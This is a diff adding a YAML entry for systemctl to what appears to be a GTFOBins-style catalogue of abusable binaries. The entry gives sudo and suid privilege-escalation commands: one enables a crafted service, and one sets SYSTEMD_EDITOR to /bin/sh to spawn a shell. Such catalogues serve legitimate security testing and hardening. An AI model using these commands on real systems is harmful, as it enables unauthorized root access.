@@ -1,0 +1,31 @@
+---
+functions:
+  inherit:
+  - code: |-
+      systemctl
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    from: less
+  shell:
+  - code: |-
+      echo '[Service]
+      Type=oneshot
+      ExecStart=/path/to/command
+      [Install]
+      WantedBy=multi-user.target' >/path/to/temp-file.service
+      systemctl link /path/to/temp-file.service
+      systemctl enable --now /path/to/temp-file.service
+    comment: |-
+      It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.
+    contexts:
+      sudo:
+      suid:
+  - code: |-
+      echo /bin/sh >/path/to/temp-file
+      chmod +x /path/to/temp-file
+      SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
+    contexts:
+      sudo:
+...
